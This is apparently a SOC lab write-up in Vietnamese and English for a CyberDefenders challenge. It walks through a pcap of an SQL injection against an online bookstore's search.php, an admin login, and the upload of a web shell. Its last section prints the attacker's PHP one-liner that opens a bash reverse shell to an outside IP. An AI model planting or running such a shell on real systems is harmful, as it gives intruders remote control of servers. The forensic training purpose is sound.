---  
title: "Web Investigation"  
date: 2026-04-22 +0700  
categories: [Lab-Writeups, CyberDefender]
tags: [SOC, SOC tier 1, Forensic, Lab, Blue, web]
image:
  path: https://github.com/user-attachments/assets/5362799d-370f-4d1a-b027-d41f2ce3b0b7
---

![image](https://hackmd.io/_uploads/Hk0GJVm6-e.png)
[Lab link is here](https://cyberdefenders.org/blueteam-ctf-challenges/web-investigation/)
## Scenario
 You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.
Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.
As the lead analyst in this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

**Artifact**: Chúng ta được cung cấp một file **pcap**.

## Solving
### Q1. By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?
Đầu tiên ta cần xác địch IP của attacker. Trong **wireshark** sử dụng Statistics -> Conversation để xem các Conversation.
![image](https://hackmd.io/_uploads/SJDWN4X6Zl.png)

Ta thấy được Conversation từ IP 111.224.250.131 có lưu lượng lớn bất thường, vậy đó chính là IP của attacker.

### Q2. If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?
Để xác định được IP đó đến từ đâu ta dùng các công cụ IP location lookup như [iplocation.net](https://www.iplocation.net/ip-lookup) để lookup và xác định được IP đó đến từ Shijiazhuang(Thạch Gia Trang) - Trung Quốc
![image](https://hackmd.io/_uploads/BkG5SV7p-e.png)
### Q3. Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable PHP script name?
Dùng filter `http contains "php" and ip.src == 111.224.250.131` để tìm các tệp PHP ta thấy tệp search PHP với parameter search bị tấn công **SQL Injection**. Vậy tệp bị attacker khai thác chính là `search.php`
![image](https://hackmd.io/_uploads/rJdpINX6Zx.png)

### Q4. Establishing the timeline of an attack, starting from the initial exploitation attempt, what is the complete request URI of the first SQLi attempt by the attacker?

Ta tiếp tục đọc thì thấy request bất thường đầu tiên 
![image](https://hackmd.io/_uploads/BkE1cVQa-e.png)

![image](https://hackmd.io/_uploads/ry5NqNQTbe.png)

Khi decode giá trị đó ra, ta thấy nó là một payload **SQL Injection**
![image](https://hackmd.io/_uploads/ryZ_iEQ6bl.png)

### Q5. Can you provide the complete request URI that was used to read the web server's available databases?
Dùng filter `ip.src == 111.224.250.131 && http.request.uri contains "/csearch.php"` để lấy các requests tấn công **SQL Injection** của attacker vào endpoint `/search.php`. Tiếp tục đọc để phân tích hành vi của attacker, giai đoạn tiếp attacker tiến hành xác định DBMS, sau khi xác định được, attacker bắt đầu liệt kê các database có trên server như ở request dưới
![image](https://hackmd.io/_uploads/r1pxqG8pZl.png)
Sau khi decode ta thấy được payload để liệt kê bảng trong database và cũng là đáp án của câu này.
![image](https://hackmd.io/_uploads/S12zcGIpWl.png)

### Q6. Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?
Lướt xuống các request dưới thì ta thấy được các request cũng query từ `INFORMATION_SCHEMA.TABLES` follow theo thì ta thấy được thông tin request và các bảng attacker đã liệt kê ra được. Ta có ba bảng:
`admin` - Có thể là thông tin admin trang web
`books` - Dữ liệu sách của website
`customers` - Có thể là khách mua hàng của website, chính là đáp án ta cần tìm
![image](https://hackmd.io/_uploads/BySgiGUpZx.png)
#### Q7. The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?
Dùng filter `ip.src == 111.224.250.131 && http` để lấy các request HTTP từ attacker và đọc ngược từ cuối lên, ta thấy có thư mục tên `admin`
![image](https://hackmd.io/_uploads/SyirAG8pbl.png)
Follow theo stream ta thấy được thư mục này tồn tại, lần đầu `/admin` redirect 301 đến đường dẫn `/admin/` sau đó redirect 302 đến `/admin/login.php` để yêu cầu xác thực
![image](https://hackmd.io/_uploads/SkliCMUp-g.png)
### Q8. Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?
Tiếp đến ta dùng filter `ip.src == 111.224.250.131 && http.request.uri contains "/admin/login.php"` thì thấy được có 5 request
![image](https://hackmd.io/_uploads/rJuO1XLaWe.png)
Follow theo stream này ta thấy được sau vài lần thử thông tin đăng nhập sai attacker đã thành công đăng nhập vào với credential là `admin:admin123!`
![image](https://hackmd.io/_uploads/r10IlmIT-g.png)
### Q9.
`ip.src == 111.224.250.131 && http.request.uri contains "/admin/"`
![image](https://hackmd.io/_uploads/BJxmWXL6bg.png)
![image](https://hackmd.io/_uploads/rJfBZ7Ia-l.png)
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>
```
![image](https://hackmd.io/_uploads/BkWzzmUpZg.png)
